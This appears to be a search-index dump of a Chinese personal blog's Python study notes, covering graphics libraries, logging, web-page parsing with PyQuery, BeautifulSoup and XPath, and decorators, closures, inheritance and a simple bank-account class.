Box2d，开源的2d物理引擎，愤怒的小鸟就是使用了这款物理引擎进行开发的，Box2d物理引擎内部模拟了一个世界，你可以设置这个世界里的重力，然后往这个世界里添加各种物体，以及他们的一些物理特性，比如质量，摩擦，阻尼等等。 Pymunk，类似box2d的开源物理图形模拟库。 OpenCV, 目前最好的开源图像/视觉库，包括图像处理和计算机视觉方面、[机器学习]的很多通用算法。 SimpleCV，计算机视觉开源框架，类似opencv。 VTK，视觉化工具函式库（VTK， Visualization Toolkit）是一个开放源码，跨平台、支援平行处理（VTK曾用于处理大小近乎1个Petabyte的资料，其平台为美国Los Alamos国家实验室所有的具1024个处理器之大型系统）的图形应用函式库。2005年时曾被美国陆军研究实验室用于即时模拟俄罗斯制反导弹战车ZSU23-4受到平面波攻击的情形，其计算节点高达2.5兆个之多。 cgkit,Python Computer Graphics Kit,其module 主要分两个部分 \\1. 与3d相关的一些python module 例如the vector, matrix and quaternion types, the RenderMan bindings, noise functions 这些模块可以在maya houdini nuke blender 等有Python扩展的程序中直接用; \\2. 提供完整的场景操作的module， 他类似其他三维软件，在内存中保留完整的描述场景的信息。不能直接用于maya 等。 CGAL，Computational Geometry Algorithms Library，计算几何算法库，提供计算几何相关的数据结构和算法，诸如三角剖分（2D约束三角剖分及二维和三维Delaunay三角剖分），Voronoi图（二维和三维的点，2D加权Voronoi图，分割Voronoi图等），多边形（布尔操作，偏置），多面体（布尔运算），曲线整理及其应用，网格生成（二维Delaunay网格生成和三维表面和体积网格生成等），几何处理（表面网格简化，细分和参数化等），凸壳算法（2D，3D和dD），搜索结构（近邻搜索，kd树等），插值，形状分析，拟合，距离等。 Aggdraw，开源","date":"2020-02-19","objectID":"/python-%E5%B8%B8%E7%94%A8%E5%BA%93/:0:0","tags":["Python"],"title":"python-常用库","uri":"/python-%E5%B8%B8%E7%94%A8%E5%BA%93/"},{"categories":["Python"],"content":"为什么会用logging模块 灵活性好，方便配置 输出或保存不同级别日志 logging模块结构 logging 在源码中有三个文件,结构如下: ├── config.py ├── handlers.py └── __init__.py __int__.py中实现了基础功能,主要的逻辑就在这个文件中 handlers.py是一些Handlers用起来很方便的. config.py 是对配置做处理的方法. 基础 import logging # 1.初始化 相当于 logger = logging.getLogger(\"test_name\") # 2.设置级别 logger.setLevel(logging.DEBUG) # 低于这个级别就不去管他 # 3. 定义handler: # 在控制台输出 FileHandler sh = logging.StreamHandler() # 定义控制台输出 sh.setLevel(logging.ERROR) # 设置最低级别 达到什么级别的时候管 低于..不执行 # 写在文件里面 SteamHandler fh = logging.FileHandler(r'file_test.log') fh.setLevel(logging.DEBUG) # 达到什么级别就写到文件里面去 # 4. 格式化输出 formatter 注意之间逗号不需要加，只是为了美观 formatter = logging.Formatter( '时间：%(asctime)s,' '日志级别:%(levelname)s,' '日志信息：%(message)s,' ) sh.setFormatter(formatter) # 设置控制台的样式 fh.setFormatter(formatter) # 设置文件的样式 # 添加进去 logger.addHandler(sh) logger.addHandler(fh) if __name__ == '__main__': logger.debug('测试中') logger.info('正常运行') logger.warn('警告') logger.error('完了error') logger.critical('炸了') # 例如： def func(a): try: num = 40/a logger.info(num) # 正常的话记录 except Exception as e: logger.error(e) # 将错误记录 func(0) ## logging 中的级别 \"\"\" DEBUG：调试信息，通常在诊断问题的时候用得着； INFO：普通信息，确认程序安装预期运行； WARNING：警告信息，表示发生了意想不到的事情，或者指示接下来可能会出现一些问题，但是程序还是继续运行； ERROR：错误信息，程序运行中出现了一些问题，一些功能没有执行； CRITICAL：危险信息，一个严重的错误，导致程序无法继续运行。 # 对应下面5个方法 debug info Warning error critical \"\"\" logging常用的格式化: ","date":"2020-02-19","objectID":"/python-logging%E6%A8%A1%E5%9D%97/:0:0","tags":["Python","logging"],"title":"python-logging模块","uri":"/python-logging%E6%A8%A1%E5%9D%97/"},{"categories":["Python"],"content":"Python爬虫解析库，主流的有 PyQuery Beautifulsoup Scrapy Selectors 正则表达式。 PyQuery和scrapy Selectors都是基于lxml模块，而lxml和正则表达式都是C语言写的，只有Beautifulsoup是用纯Python编写的，所以在实测中，Beautifulsoup 的解析速度比其他几种慢了5倍以上！ 正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错）; Scrapy Selectors支持css，xpath以及正则表达式 ; PyQuery只支持css（css语法更精简一些）， 类似于jQuery Scrapy Selector中的css语法和PyQuery中的略有不同，本文以PyQuery为例（不用Scrapy框架的话，PyQuery就够用了） ","date":"2020-02-19","objectID":"/python-pyquery/:0:0","tags":["Python","PyQuery"],"title":"python-PyQuery","uri":"/python-pyquery/"},{"categories":["Python"],"content":"安装 pip3 install pyquery ","date":"2020-02-19","objectID":"/python-pyquery/:0:1","tags":["Python","PyQuery"],"title":"python-PyQuery","uri":"/python-pyquery/"},{"categories":["Python"],"content":"使用 初始化 import requests from pyquery import PyQuery as pq url = 'https://www.guokr.com/' r = requests.get(url) # 实例化 doc = pq(r.text) 获取元素 跟jQuery是一样的，也就不细说了，简单举几个小例子 # 1.获取class是content-title的元素 # class是点. id是# print(doc('h2.content-title')) # 获取果壳网 # 2.获取标签的文本内容 print(doc('h2.content-title').text()) # 3.遍历（先items()） lis = doc('h2.content-title').items() for li in lis: print(li.text()) # 4. 获取class为content的div标签下面的ul下面的li # 用空格表示子孙节点 lis = doc('div.content ul li').items() #lis = doc('div.content li').items() for i in lis: print(i.text()) # 5. 如果类名不唯一，还可以加上其他的类名一起定位 print(doc('div.cont.a.b.c.d')) # 标签里的空格表示`并列`，表示这个div标签有cont,a,b,c,d这五个类名，但在css语法里空格表示`嵌套`，所以我们要添加其他类名的时候`不能输入空格`，而是直接用`小数点`来添加其他类名 # 6. 获取属性 attr(\"属性名\") lis = doc('div.content li').items() for i in lis: print(i.text(),i('a').attr('href')) # 7. 其他的一些选择器 lis = doc('div.content ul li') #父节点,包含父节点的所有子孙节点的内容 #相当于 #print(doc('div.content ul')) print(lis.parent()) #祖先节点,就相当于所有源代码了 print(lis.parents()) #兄弟节点,即同级节点，不包含自己 print(lis.siblings) 其他技巧 1.伪类选择器 #第二个标签 lis = doc('div.content li:nth-child(2)').items() for i in lis: print(i.text(),i('a').attr('href')) # 第一个a标签的语法是 a:first-child,最后一个是a:last-child,其它位置的语法如上图所示，第几个括号里就是几（当然第一个你也可以写成 li:nth-child(1)) 类似的 #div.content 下面第二个（含）之后的li标签 lis = doc('div.content li:gt(1)').items() for i in lis: print(i.text(),i('a').attr('href')) # gt就是greater than,大于的意思，lt (less than)是小于 筛选文本 lis = doc('div.content ul').items() for i in lis: #文本包含问号的li标签 print(i(\"li:contains('？')\").text()) 2.修改标签属性 #用remove把特定标签移除，然后再进行遍历 lis = doc('div.content ul').remove('.content-article').items() for i in lis: print(i.text()) # 还有如修改属性，增加css之类的一些使用率较低的，用到的时候去官方文档查 直接在Chrome里调试 Chrome浏览器自带css的查询方法，按f12或者右键检查，打开Elements面板，按ctrl+f， 这里支持xpath，css语法，以及普通的字符查找 要注意的是右边的数字，显示的是满足条件的标签数量，可以按向下的箭头过一遍，看看是不是自己想要的信息。 京东的商品栏目 import requests from pyquery import PyQuery as pq url = 'https://www.jd.com/' r = requests.get(url) # 实例化 doc = pq(r.text) flag = 1 # for i in doc(\"li.cate_menu_item:nth-child(3) a\").items(): for i in doc(\"li.cate_menu_item:gt(1) a\").items(): # print(i.text()) print(i.attr('href')) print(i.text()) flag = flag + 1 print(\"------------\") print(flag) 参考文章：https://www.jianshu.com/p/7eb136bbe317 更多用法：https://pythonhosted.org/pyquery/ ","date":"2020-02-19","objectID":"/python-pyquery/:0:2","tags":["Python","PyQuery"],"title":"python-PyQuery","uri":"/python-pyquery/"},{"categories":["Python"],"content":"Beautifulsoup也是用来解析网页数据的 BeautifulSoup对象四种类型: tag NavigableString BeautifulSoap Comment ","date":"2020-02-19","objectID":"/python-beautifulsoup/:0:0","tags":["Python","Beautifulsoup"],"title":"python-Beautifulsoup","uri":"/python-beautifulsoup/"},{"categories":["Python"],"content":"初始化 安装 pip3 install beautifulsoup4 导入 from bs4 import BeautifulSoup ","date":"2020-02-19","objectID":"/python-beautifulsoup/:1:0","tags":["Python","Beautifulsoup"],"title":"python-Beautifulsoup","uri":"/python-beautifulsoup/"},{"categories":["Python"],"content":"使用 from bs4 import BeautifulSoup soup = BeautifulSoup(html_doc, 'html.parser') print(soup.title) 查找 基本 soup = BeautifulSoup(open(\"index.html\")) #文件句柄 soup = BeautifulSoup(\"\u003chtml\u003edata\u003c/html\u003e\") #字符串 find 和 find_all 搜索当前 tag 的所有 tag 子节点，并判断是否符合过滤器的条件 语法： find(name=None, attrs={}, recursive=True, text=None, **kwargs) find_all(name=None, attrs={}, recursive=True, text=None, limit=None, **kwargs) 通过 attrs 参数传递： data_soup = BeautifulSoup('\u003cdiv data-foo=\"value\"\u003efoo!\u003c/div\u003e') print(data_soup.find_all(attrs={\"data-foo\": \"value\"})) 按 class_ 查找: css_soup = BeautifulSoup('\u003cp class=\"body bold strikeout\"\u003e\u003c/p\u003e') print(css_soup.find_all(\"p\", class_=\"strikeout\")) print(css_soup.find_all(\"p\", class_=\"body\")) 其他搜索方法： find_parents()　# 返回所有祖先节点 find_parent()　# 返回直接父节点 find_next_siblings()　# 返回后面所有的兄弟节点 find_next_sibling()　# 返回后面的第一个兄弟节点 find_previous_siblings() # 返回前面所有的兄弟节点 find_previous_sibling() #　返回前面第一个兄弟节点 find_all_next()　# 返回节点后所有符合条件的节点 find_next()　# 返回节点后第一个符合条件的节点 find_all_previous()　# 返回节点前所有符合条件的节点 find_previous()　# 返回节点前所有符合条件的节点 从文档中找到所有a标签的链接: for link in soup.find_all('a'): print(link.get('href')) 从文档中获取所有文字内容: print(soup.get_text()) 对象 Tag Tag对象与XML或HTML原生文档中的tag相同 tag中最重要的属性: name和attributes name tag.name # 复赋值 tag.name = \"xxx\" attributes 一个tag可能有很多个属性，一个属性可能有很多个值。 # 获取tag的指定属性的属性值 tag['class'] # 获取tag的全部属性及属性值: tag.attrs # tag属性及属性值添加 tag['class'] = 'row' # 属性值的删除 del tag['class'] # 查看属性值 print(tag.get('class')) 多值属性tag： 返回类型一般是list,但当某个属性在任何版本的HTML定义中都没有被定义为多值属性时，会将这个属性作为字符串返回 css_soup = BeautifulSoup('\u003cp class=\"body row\"\u003e\u003c/p\u003e') css_soup.p['class'] # [\"body\", \"row\"] css_soup = BeautifulSoup('\u003cp class=\"body\"\u003e\u003c/p\u003e') css_soup.p['class'] # [\"body\"] id_soup = BeautifulSoup('\u003cp id=\"my id\"\u003e\u003c/p\u003e') id_soup.p['id'] # 'my id' 如果转换的文档是XML格式,那么tag中不包含多值属性 获取tag某个子节点: soup.tag名， soup.a 获取tag全部子节点: .contents 和 .children 获取tag全部子节点及子孙节点：.descendants for child in head_tag.descendants: print(child) 节点内的字符串: # .string head_tag.string # .strings 如果tag中包含多个字符串`.strings` 来循环获取 head_tag.strings for string in soup.strings: print(repr(string)) # .stripped_strings 去除空行空白 for string in soup.stripped_strings: print(repr(string)) 父亲节点：.parent 所有父辈节点：.parents 兄弟节点: .prettify(), 其中next_sibling和previous_sibling是前后兄弟 回退和前进： 通过 .next_elements 和 .previous_elements 的迭代器就可以向前或向后访问文档的解析内容,就好像文档正在被解析一样 find_all # 过滤str soup.find_all('b') # 过滤正则 for tag in soup.find_all(re.compile(\"^b\")): print(tag.name) # 过滤多个 soup.find_all([\"a\", \"b\"]) # True:可以匹配任何值,下面代码查找到所有的`一级`tag for tag in soup.find_all(True): print(tag.name) # limit 显示返回数量 soup.find_all(\"a\", limit=2) # 只搜索tag的直接子节点, soup.html.find_all(\"title\", recursive=False) def test(tag): #包含 class 属性却不包含 id 属性 return tag.has_attr('class') and not tag.has_attr('id') # 调用 soup.find_all(test) #下面两行代码是等价的 soup.find_all('div', limit=1) soup.find('div') 区别:find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果.find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None NavigableString 可遍历字符串 通过 unicode() 方法可以直接将 NavigableString 对象转换成Unicode字符串: unicode_string = unicode(tag.string) BeautifulSoup 表示的是一个文档的全部内容,可以把它当作 Tag 对象，是一个特殊的 Tag，我们可以分别获取它的类型，名称，以及属性。 Comment html_doc='\u003ca href=\"http://z.com\" class=\"row\" id=\"box\"\u003e\u003c!-- hhh --\u003e\u003c/a\u003e' soup = BeautifulSoup(html_doc, 'html.parser') print(soup.a.string) # hhh print(type(soup.a.string)) # \u003cclass 'bs4.element.Comment'\u003e \"\"\" a 标签里的内容实际上是注释，但是如果我们利用 .string 来输出它的内容，我们发现它已经把注释符号去掉了，所以这可能会给我们带来不必要的麻烦。 \"\"\" # 在使用前最好做一下判断 if type(soup.a.string)==bs4.element.Comment: print soup.a.string ","date":"2020-02-19","objectID":"/python-beautifulsoup/:2:0","tags":["Python","Beautifulsoup"],"title":"python-Beautifulsoup","uri":"/python-beautifulsoup/"},{"categories":["Python"],"content":"XPath XPath，全称 XML Path Language，即 XML 路径语言，它是一门在 XML 文档中查找信息的语言。最初是用来搜寻 XML 文档的，但同样适用于 HTML 文档的搜索。所以在做爬虫时完全可以使用 XPath 做相应的信息抽取。 ","date":"2020-02-19","objectID":"/python-xpath/:0:0","tags":["Python","XPath"],"title":"python-XPath","uri":"/python-xpath/"},{"categories":["Python"],"content":"python库lxml的安装 pip3 install lxml ","date":"2020-02-19","objectID":"/python-xpath/:0:1","tags":["Python","XPath"],"title":"python-XPath","uri":"/python-xpath/"},{"categories":["Python"],"content":"XPath常用规则 表达式 描述 nodename 选取此节点的所有子节点 / 从当前节点选取直接子节点 // 从当前节点选取子孙节点 . 选取当前节点 .. 选取当前节点的父节点 @ 选取属性 * 通配符，选择所有元素节点与元素名 @* 选取所有属性 [@attrib] 选取具有给定属性的所有元素 [@attrib=‘value’] 选取给定属性具有给定值的所有元素 [tag] 选取所有具有指定元素的直接子节点 [tag=‘text’] 选取所有具有指定元素并且文本内容是text节点 ","date":"2020-02-19","objectID":"/python-xpath/:0:2","tags":["Python","XPath"],"title":"python-XPath","uri":"/python-xpath/"},{"categories":["Python"],"content":"XPath中的运算符 运算符 描述 实例 返回值 or 或 age=19 or age=20 如果age等于19或者等于20则返回true反正返回false and 与 age\u003e19 and age\u003c21 如果age等于20则返回true，否则返回false mod 取余 5 mod 2 1 | 取两个节点的集合 //book | //cd 返回所有拥有book和cd元素的节点集合 + 加 6+4 10 - 减 6-4 2 * 乘 6*4 24 div 除法 8 div 4 2 = 等于 age=19 true != 不等于 age!=19 true \u003c 小于 age\u003c19 true \u003c= 小于或等于 age\u003c=19 true \u003e 大于 age\u003e19 true \u003e= 大于或等于 age\u003e=19 true ","date":"2020-02-19","objectID":"/python-xpath/:0:3","tags":["Python","XPath"],"title":"python-XPath","uri":"/python-xpath/"},{"categories":["Python"],"content":"解析方式 from lxml import etree text=''' \u003cdiv\u003e \u003cul\u003e \u003cli class=\"item-0\"\u003e\u003ca href=\"link1.html\"\u003e第一个\u003c/a\u003e\u003c/li\u003e \u003cli class=\"item-1\"\u003e\u003ca href=\"link2.html\"\u003esecond item\u003c/a\u003e\u003c/li\u003e \u003cli class=\"item-0\"\u003e\u003ca href=\"link5.html\"\u003ea属性\u003c/a\u003e \u003c/ul\u003e \u003c/div\u003e ''' # 1.读取文本解析节点 html=etree.HTML(text) #初始化生成一个XPath解析对象 result=etree.tostring(html,encoding='utf-8') #解析对象输出代码 # 2.读取HTML文件进行解析 html=etree.parse('test.html',etree.HTMLParser()) #指定解析器HTMLParser会根据文件修复HTML文件中缺失的如声明信息 result=etree.tostring(html) #解析成字节 #result=etree.tostringlist(html) #解析成列表 获取元素节点 # 1.获取所有节点 // from lxml import etree html=etree.parse('test.html',etree.HTMLParser()) result=html.xpath('//*') #//代表获取子孙节点，*代表获取所有 # 如要获取li节点，可以使用//后面加上节点名称，然后调用xpath()方法 html.xpath('//li') #获取所有子孙节点的li节点 # 2.获取子节点 / result=html.xpath('//li/a') #通过追加/a选择所有li节点的所有直接a节点，因为//li用于选中所有li节点，/a用于选中li节点的`所有直接子节点a` # 3.获取父节点 .. parent:: # 使用`..`来实现也可以使用`parent::`来获取父节点 html=etree.HTML(text, etree.HTMLParser()) result=html.xpath('//a[@href=\"link2.html\"]/../@class') result1=html.xpath('//a[@href=\"link2.html\"]/parent::*/@class' # 4.根据属性匹配节点 //div[@class='box'] html=etree.HTML(text, etree.HTMLParser()) result=html.xpath('//li[@class=\"item-1\"]') print(result) # 5.获取节点中的文本 text() html=etree.HTML(text,etree.HTMLParser()) result=html.xpath('//li[@class=\"item-1\"]/a/text()') #获取a节点下的内容 result1=html.xpath('//li[@class=\"item-1\"]//text()') #获取li下所有子孙节点的内容 # 6. 获取属性 @href, @class, @src result=html.xpath('//li/a/@href') #获取a的href属性 result=html.xpath('//li//@href') #获取所有li子孙节点的href属性 # 7. 属性多值匹配节点(某个属性的值有多个时，一个节点有多个属性值) contains() text1=''' \u003cdiv\u003e \u003cul\u003e \u003cli class=\"aaa item-0\"\u003e\u003ca href=\"link1.html\"\u003e第一个\u003c/a\u003e\u003c/li\u003e \u003cli class=\"bbb item-1\"\u003e\u003ca href=\"link2.html\"\u003esecond item\u003c/a\u003e\u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e ''' html=etree.HTML(text1,etree.HTMLParser()) result1=html.xpath('//li[contains(@class,\"aaa\")]/a/text()') # 8.多属性匹配（根据多个属性确定一个节点， 多个节点有相同的属性值） and text1=''' \u003cdiv\u003e \u003cul\u003e \u003cli class=\"aaa\" name=\"item\"\u003e\u003ca href=\"link1.html\"\u003e第一个\u003c/a\u003e\u003c/li\u003e \u003cli class=\"aaa\" name=\"fore\"\u003e\u003ca href=\"link2.html\"\u003esecond item\u003c/a\u003e\u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e ''' html=etree.HTML(text1,etree.HTMLParser()) result=html.xpath('//li[@class=\"aaa\" and @name=\"fore\"]/a/text()') result1=html.xpath('//li[contains(@class,\"aaa\") and @name=\"fore\"]/a/text()') # 9. 按序选择 # 可能同时匹配多个节点，但我们只想要其中的某个节点，如第二个节点或者最后一个节点，这时可以利用中括号引入索引的方法获取特定次序的节点： [1], [last()], position() result=html.xpath('//li[contains(@class,\"aaa\")]/a/text()') #获取所有li节点下a节点的内容 result1=html.xpath('//li[1][contains(@class,\"aaa\")]/a/text()') #获取第一个 result2=html.xpath('//li[last()][contains(@class,\"aaa\")]/a/text()') #获取最后一个 result3=html.xpath('//li[position()\u003e2 and position()\u003c4][contains(@class,\"aaa\")]/a/text()') #获取第三个 result4=html.xpath('//li[last()-2][contains(@class,\"aaa\")]/a/text()') #获取倒数第三个 # XPath的函数： http://www.w3school.com.cn/xpath/xpath_functions.asp # 10. 节点轴选择 # 包括获取子元素、兄弟元素、父元素、祖先元素等 result=html.xpath('//li[1]/ancestor::*') #获取所有祖先节点 result1=html.xpath('//li[1]/ancestor::div') #获取div祖先节点 result2=html.xpath('//li[1]/attribute::*') #获取所有属性值 result3=html.xpath('//li[1]/child::*') #获取所有直接子节点 result4=html.xpath('//li[1]/descendant::a') #获取所有子孙节点的a节点 result5=html.xpath('//li[1]/following::*') #获取当前子节之后的所有节点 result6=html.xpath('//li[1]/following-sibling::*') #获取当前节点的所有同级节点 # 更多轴的用法可参考：http://www.w3school.com.cn/xpath/xpath_axes.asp 本文参考：https://www.cnblogs.com/zhangxinqi/p/9210211.html 博主写的很详细，也很美观 XPath的更多用法参考：http://www.w3school.com.cn/xpath/index.asp python lxml库的更多用法参考：http://lxml.de/ ","date":"2020-02-19","objectID":"/python-xpath/:0:4","tags":["Python","XPath"],"title":"python-XPath","uri":"/python-xpath/"},{"categories":["Python"],"content":"装饰器 ###函数的装饰器,本质上就是一个闭包 ## 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2 @f1 #装饰器 (@符号加函数名,装饰上了gun函数) #相当于f1(gun) def gun(m): print('gun runing') return m*m ## @f1 -\u003e f1( gun) -\u003e f2 n=gun(5) # gun(5) -\u003e 就是在运行 f2(5) print(n) #############例子: import time def run_time(func): def new_fun(*args,**kwargs): t0 = time.time() print('star time: %s'%(time.strftime('%X',time.localtime())) ) back = func(*args,**kwargs) print('end time: %s'%(time.strftime('%X',time.localtime())) ) print('run time: %s'%(time.time() - t0)) return back return new_fun @run_time def test2(n): for i in range(1,n): for j in range(1,i+1): print('%dx%d=%2s'%(j,i,i*j),end = ' ') print () #@run_time -\u003e run_time(test2) -\u003e new_fun n = test2(10) #就相当于运行new_time(5) 例子 # 写一个login函数 然后写一个装饰器，模拟登录过程：让程序延迟3秒 在延迟过程中输出正在验证 \"\"\" def login(): print('登录成功') \"\"\" import time def login_required(func): def wrpper(*args,**kwargs): print('正在验证...') time.sleep(5) return func(*args,**kwargs) return wrpper @login_required def login(): print('登录成功') #return 'code:200' login() 类作为装饰器 ## 用__call__方法 class Tset_Class(): def __init__(self,func): # 传进来函数 print('正在实例化') self.func = func def __call__(self, *args, **kwargs): #类装饰器, 一定要写__call__方法 print('这是call方法') return self.func @Tset_Class def test(): print('这是一个测试函数') n = test() # self.func : test 函数体 n() # n() 调用test（） # 1. @Tset_Class ： Tset_Class( test ) -\u003e 相当于：t = Tset_Class( test ) # 2. test() -\u003e 相当于： 调用实例的call方法 -\u003e 返回 self.func函数体 # 3. n = test() ，n() 调用test（） 类中常见的几种装饰器 class Test(): aa = 123 def __init__(self,name): self.__name = name @property # 把方法变成属性 def get_name(self): print( self.__name) return self.__name @get_name.setter # 可以让get方法，变成set方法 def get_name(self,name): self.__name = name @property # 把方法变成属性 def po(self): print('asdfasdfasdfasdaf') @staticmethod def test(): print('staticmethod func') @classmethod def show(cls): print(cls.aa) # 可以访问类属性 print('classmethod func ') t = Test('jianeng') t.show() # @property # t.get_name = 4 # get_name.setter 没有写的时候， = 4 会报错 # t.get_name # t.po # @staticmethod #没有self t.test() # 没有self ，实例不能调用。 Test.test() # 类名可以直接调用 ### @classmethod #类方法, 一般是用来做封装 class名字已经传进去了 Test.show() #有self， 类名不能直接调用 t.show() ##静态方法装饰器： staticmethod 类调用与实例调用无差别， 也不需要self参数，类似于普通函数 不需实例化就可以调用,直接用类名调用 （与实例解绑）， 不能访问其他的类属性与方法（相当于类的方法） ##类方法装饰器： classmethod self参数被换成cls参数， 自动传入对应的类 可以访问类属性与其他类方法 ","date":"2020-02-19","objectID":"/python%E5%9F%BA%E7%A1%80-%E8%A3%85%E9%A5%B0%E5%99%A8/:0:0","tags":["Python","装饰器"],"title":"python基础-装饰器","uri":"/python%E5%9F%BA%E7%A1%80-%E8%A3%85%E9%A5%B0%E5%99%A8/"},{"categories":["Python"],"content":" # 闭包: 一个函数里面嵌套一个函数,调用外层函数返回里层函数本身 #1. def fx(x): x+=1 def fy(y): return x*y return fy #不要加括号 f=fx(5) #拿到fy的函数体 n = f(5) #fy() print(n) #2.传进去的参数为函数体 def f1(func): print('f1 runing') def f2(y): print('f2 running') return func(y) +1 return f2 def gun(m): print('gun runing') return m*m temp = f1(gun) # 返回f2函数体 # f1 runing -\u003e f2 -\u003etemp n= temp(5) # f2( 5) -\u003e ' f2 running ' -\u003e return func(y) +1 # func(y) === gun(m) -\u003e gun runing -\u003e 5*5 # return 25 +1 -\u003e 26 print(n) ","date":"2020-02-19","objectID":"/python%E5%9F%BA%E7%A1%80-%E9%97%AD%E5%8C%85/:0:0","tags":["Python","闭包"],"title":"python基础-闭包","uri":"/python%E5%9F%BA%E7%A1%80-%E9%97%AD%E5%8C%85/"},{"categories":["Python"],"content":"用之前学习笔记的小例子来复习一下 ############################继承 #父类里面有的,子类里面再写一次. 叫做重写 ,只会用子类的了,父类的就屏蔽了 #继承是通过查找来找的, 不是变量空间的复制, 还是独立的变量空间 # 多继承 既不是广度也不是深度搜索 . mro() 方法,是在类里面的,他会自己计算出搜索顺序 例如: print(Magician.mro())或print(Magician.__mro__) 或者 print(s.__class__.mro()) # [\u003cclass '__main__.Magician'\u003e, \u003cclass '__main__.Role'\u003e, \u003cclass 'object'\u003e] # super 自己找父类, 如果父类改变,也不需要修改,哪怕父类被更换，也不用担心了！ super不需要再传self ,super是通过mro查找的 #__bases__特殊属性 print(Role.__bases__) 打印出来是一个元组 (\u003cclass 'object'\u003e,) #实例+() 自动调用__call__方法 class Role: def __init__(self,name,level,blood): # 在实例化之后自动被调用,用来进行初始化 self.name = name self.level = level self.blood = blood def __repr__(self): return \"{cls}:{name},{level},{blood}\".format(cls=self.__class__.__name__, name=self.name, level=self.level, blood=self.blood ) def figth(self): raise NotImplementedError('必须在子类中实现该行为') class SwordsMan(Role): #继承了Role类 def __init__(self,name,level,blood,attack_power): #重写了__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) #不在明确指定类名 self.attack_power = attack_power def fight(self): print('物理攻击') class Magician(Role): #继承自Role def __init__(self,name,level,blood,magical_power): #重写了__init__ #Role.__init__(self,name,level,blood) super().__init__(name, level, blood) # 不在明确指定类名 self.magical_power = magical_power def fight(self): print('魔法攻击') def cure(self): print('治疗') ## 鸭子类型 #展示出攻击的效果(这件事,不属于任何一个角色) #写出一个函数 def draw_fight(role): # 鸭子类型体现出来是,一个函数,所关心的不是类型,而是行为 print('role', end='') role.fight() # 其实并不关心,role是不是一个role实例 class GirlFriend: #虽然没有继承Role类,依然可以用鸭子类型 def __init__(self,name): self.name = name def fight(self): print('拔电源攻击') g = GirlFriend('xxx') draw_fight(g) #打印出role拔电源攻击 s= SwordsMan('xps',18,3000,150) #实例化 m = Magician('ps',18,1400,6660) draw_fight(s) #打印出 role物理攻击 draw_fight(m) #打印出 role魔法攻击 print(s) print(m.__repr__()) print('***********************************************************') # 继承是通过查找来找的, 不是变量空间的复制, 而是独立的变量空间 class BaseClass: attribute = 1 def method(self): pass class DerivedClass: # 简单继承,没有任何的封装与重写 pass print(DerivedClass.__dict__) # DerivedClass中没有 attribute 与 method print(BaseClass.__dict__) # BaseClass中有 print(Magician.__mro__) print(s.__class__.mro()) ","date":"2020-02-19","objectID":"/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E7%BB%A7%E6%89%BF%E5%B0%8F%E5%B0%8F%E4%BE%8B%E5%AD%90/:0:0","tags":["Python","继承"],"title":"python面向对象-继承小小例子","uri":"/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E7%BB%A7%E6%89%BF%E5%B0%8F%E5%B0%8F%E4%BE%8B%E5%AD%90/"},{"categories":["Python"],"content":"用一个银行存款取款的例子来回忆一下面向对象最基础的部分 class Account: all_count={} #类属性 def __init__(self, name, number, balance): # 初始化账户的'实例方法',见名知意 self.name = name self.number = number # 实例的变量属性 self.balance = balance self.all_count[self.number] = self # # def __del__(self): #当实例对象被销毁的时候,当变量的指向为0的时候 自动触发 # print(self.name,'被销毁了') def deposit(self, amount): # 存款 if amount \u003c= 0: print('存款金额不得为负') else: self.balance += amount def withdraw(self, amount): # 取款 if amount \u003e self.balance: print('余额不足') else: self.balance -= amount def describe(self): # 查询账户详情 return \"Account(姓名:{name},账户:{number},余额:{balance})\".format(name=self.name, number=self.number, balance=self.balance) def close(self): self.all_count.pop(self.number) a=Account('xps','6217',10000) v = getattr(a,'nme','000') # b = a # del a print(v) # a.deposit(5000) # a.withdraw(2500) # print(a.describe()) # # print(a.__dict__) # print(__name__) ############################################ 笔记 #######################################3 #__init__() 在实例化之后自动被调用,用来进行初始化 #__del__() 删除变量的指向,不是直接去删除这个对象 例如:a=[1,2,3] b=a del a a变量没了,但是b还存在 #程序执行完之后变量的内存自动释放.自动触发 __del__ #__str__() #str 会自动触发 对用户友好 后面可以直接 print(a) 来输出str的值,如果没有定义a,则输出repr的值 #__repr__() repr会自动触发 对开发者友好 在控制台shell 直接 a 输出repr的值 ,如果repr没有定义,则不会找str #getattr() getattr(i,'name','没有') 相当于转换成对象的访问 obj.name 获取,,和字典里面的get()方法类似,找不到返回'没有' 'name'这里是一个字符串 #hasattr() hasattr(i,'xxx') 返回布尔值 (还可以避免因为属性没有而产生报错) 'xxx'也是字符串 hasattr 还可以避免，因为属性没有，而导致的报错 #setattr() setattr(i,'name','vvv'') 自动转换成i.name = 'vvv' 'name'这里是一个字符串 #delattr() delattr(i,'name') 删除 'name'这里是一个字符串 转化成del i.name #__class__ 可以得到一个类实例所属的类对象,print(a.__class__) \u003cclass '__main__.Account'\u003e 不是类名 #__doc__ 注释文档写了之后,可以help出来 如:print(help(Account)) # 注释存储在了__doc__里 如: print(Account.__doc__)可以打印其文档注释 #__dict__ 一个存储了对象属性的字典 把该变量空间的打印出来 # 例:print(a.__dict__) \u003e\u003e{'balance': 12500, 'name': 'xps', 'number': '6217'} #类也可以 print(Account.__dict__) #__name__ def dance(): pass print(dance.__name__) #可以查看该函数的名字 class C: pass print(C.__name__) #可以查看该类的名字 #类名 是一个字符串 #print 输出的是你给他的东西得 __str__ #shell 里面 输出的是 你给他的东西的 __repr__ #self 是实例本身 # print 输出的str 但是如果输出一个数据结构(集合元组字典列表)的数据,里面的数据,会以repr展示 ######################################################################################## if __name__ == '__main__': pass #print(str(__name__)) __name__ #import 的时候,会把那个文件执行一遍 ###如果作为一个模块被导入的话,就不会调用__name__以下的东西 # print(__name__) 结果为 __main__ #######################################################闭包###########################33 class A: def __del__(self): print('被销毁0') def outer(): # a=A() #a 是在函数调用时候实例化的 def inner(): #inner 也是在outer里面定义的,在outer结束的时候inner也被销毁 print(a) return inner x = outer() #用一个变量去接受,就不会打印出来,inner获得一个临时指向 del x #销毁函数inner #1.构造局部的全局变量 #2.在没有类的情况下,封装变量 input() ######私有化,保护作用,类的外面访问不到 